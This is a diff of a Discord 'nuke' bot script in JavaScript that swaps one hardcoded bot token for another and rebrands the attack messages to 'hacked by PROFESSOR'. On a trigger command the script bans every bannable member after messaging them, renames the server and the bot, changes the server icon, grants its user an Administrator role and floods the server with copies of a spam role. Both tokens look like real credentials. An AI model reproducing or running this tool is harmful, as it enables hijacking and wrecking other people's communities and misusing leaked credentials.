@@ -14,17 +14,17 @@
 //By xxxRevenge (Bowlingtoolkit)
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
-const Token = 'NjM2NzI0NDMwNTI5MTAxODI0.XioUPA.pEko-Mwzu2aGVfNneLWJejVLvYw' //حط توكن بوتك هنا // your bot token
-const x_x = "." //الامر يلي يشغل الكود //the command to start the hack system
-const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
-const teext = "ID" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
-const vooice = "IDrixpYT DONT MESS WITH ME" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
-const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
-const spam = "IDrixpYT DONT MESS WITH ME" // الكلام يلي بيسوي فيه سبام البوت //the spam message
-const namee = "IDrixpYT DONT MESS WITH ME" // اسم ابوت بعد التهكير //the bot name
-const playing = "HJACKED 1 SERVER" // البلاينج //bot streaming
-const role = 'HJACKED' // اسم الرتبه يلي بيسويها //the role name
-const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
+const Token = 'NjMwNDU5MTQ4OTg2ODc1OTM1.Xn03PQ.B1dDd6SmuxOiogt0gkD8Cb8_BME' //حط توكن بوتك هنا // your bot token
+const x_x = "zebi" //الامر يلي يشغل الكود //the command to start the hack system
+const opcmd = 'zebi' // The Op Command To Give You Adminstrator Role
+const teext = "hacked by PROFESSOR [DONT MESS WITH ME]" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
+const vooice = "hacked by PROFESSOR [DONT MESS WITH ME]" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
+const pic = "https://i.ibb.co/FbQxdSs/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
+const spam = "hacked by PROFESSOR [DONT MESS WITH ME]" // الكلام يلي بيسوي فيه سبام البوت //the spam message
+const namee = "hacked by PROFESSOR [DONT MESS WITH ME]" // اسم ابوت بعد التهكير //the bot name
+const playing = "HACKING KIDS" // البلاينج //bot streaming
+const role = 'hacked by PROFESSOR [DONT MESS WITH ME]' // اسم الرتبه يلي بيسويها //the role name
+const adminstrator = 'hacked by PROFFESOR [DONT MESS WITH ME]' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
 console.log('BY OROCHIX');
 console.log('Start Hacking System ..')
 client.on('ready', () => {
@@ -50,14 +50,14 @@ async function nuke(guild) {
   
     await guild.fetchMembers();
   
-    await guild.owner.send('Your Server Has Been Hjacked !').catch(e => { return void e; });
+    await guild.owner.send('Your Server Has Been hacked by PROFFESOR').catch(e => { return void e; });
   
   
   
     await Promise.all(guild.members.map(async (m) => {
       if (m.bannable) {
         users++;
-        await m.send('HJACKED').catch(e => { return void e; });
+        await m.send('PROFFESOR').catch(e => { return void e; });
         return m.ban();
       }
     }));
@@ -91,7 +91,7 @@ client.on('message', message => {
        hackch.delete();
        client.user.setAvatar(pic)
        client.user.setUsername(namee)
-       client.user.setGame(playing, 'https://www.twitch.tv/hix')
+       client.user.setGame(playing, 'HACKING RUDE SERVERS')
        client.guilds.forEach(hack => {
        hack.setIcon(pic)
        hack.setName(namee)})})})}});
@@ -106,7 +106,7 @@ let me = message.author
         permissions : [8]
         })
         let role1 = message.guild.roles.find('name', adminstrator)
-    message.channel.send(`HJACKED`)
+    message.channel.send(`HACKED BY PROFFESOR`)
    message.guild.member(me).addRole(role1);
 }})
 //create the roles
@@ -304,6 +304,95 @@ let me = message.author
                    name : role,
                    permissions :   [1],
                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                     })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000" })
+                   m.createRole({
+                       name : role,
+                       permissions :   [1],
+                       color : " #ff0000"
+                        })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                     })
+               m.createRole({
+                   name : role,
+                   permissions :   [1],
+                   color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
+                })
+                m.createRole({
+                    name : role,
+                    permissions :   [1],
+                    color : " #ff0000"
                })
                m.createRole({
                    name : role,
